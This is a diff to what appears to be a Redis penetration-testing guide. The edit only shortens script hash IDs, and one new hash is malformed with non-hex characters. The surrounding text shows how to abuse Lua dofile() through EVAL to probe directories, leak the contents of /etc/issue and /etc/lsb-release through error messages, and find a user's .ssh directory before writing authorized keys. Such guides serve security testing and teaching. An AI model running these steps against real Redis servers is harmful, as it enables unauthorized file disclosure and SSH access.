@@ -69,7 +69,7 @@ Redis can execute sandboxed Lua scripts through the "EVAL" command. `dofile()` i
 
 Within redis-cli:
 `EVAL "dofile('/var/')" 0`
-- should return something like: `(error) ERR Error running script (call to f_de02e3f8f35b9def4742c4d51dd5b0e3e4b033e5): cannot read /var/: Is a directory ` confirming the directory exists. If not, the error would be "no such file or directory"
+- should return something like: `(error) ERR Error running script (call to f_de02e4b033e5): cannot read /var/: Is a directory ` confirming the directory exists. If not, the error would be "no such file or directory"
 
 If the Lua script is syntactically invalid or tries to set global variables, some content of the target file will be leaked through the error messages. 
 
@@ -77,12 +77,12 @@ Examples:
 
 ```
 EVAL "dofile('/etc/issue')" 0
-(error) ERR Error running script (call to f_8a4872e08ffe0c2c5eda1751de819afe587ef07a): /etc/issue:1: '=' expected near '16.04' 
+(error) ERR Error running script (call to f_8a4872e19afe587ef07a): /etc/issue:1: '=' expected near '16.04' 
 ```
 and
 ```
 EVAL "dofile('/etc/lsb-release')" 0
-(error) ERR Error running script (call to f_d486d29ccf27cca592a28676eba9fa49c0a02f08): /etc/lsb-release:1: Script attempted to access unexisting global variable 'Ubuntu' 
+(error) ERR Error running script (call to f_d486d29ccfa02f08): /etc/lsb-release:1: Script attempted to access unexisting global variable 'Ubuntu' 
 ```
 That gives us the info we're likely dealing with an ubuntu 16.04 machine. 
 
@@ -104,9 +104,9 @@ Connect to redis and find a user directory with .ssh directory:
 ```shell
 redis-cli -h x.x.x.x
 x.x.x.x:6379> EVAL "dofile('/home/')" 0
-(error) ERR Error running script (call to f_351f13c20f479b8ac8bde46fdc9b831d3b093b44): @user_script:1: cannot read /home/: Is a directory
+(error) ERR Error running script (call to f_351f13c20fb831d3b093b44): @user_script:1: cannot read /home/: Is a directory
 x.x.x.x:6379> EVAL "dofile('/home/user/.ssh')" 0
-(error) ERR Error running script (call to f_1508eef1e3b382e49753c37a8f507f0eb65ab351): @user_script:1: cannot read /home/user/.ssh: Is a directory 
+(error) ERR Error running script (call to f_1508afgsfgf507f0eb65ab351): @user_script:1: cannot read /home/user/.ssh: Is a directory 
 ```
 
 Then write the authorized keys file and save:
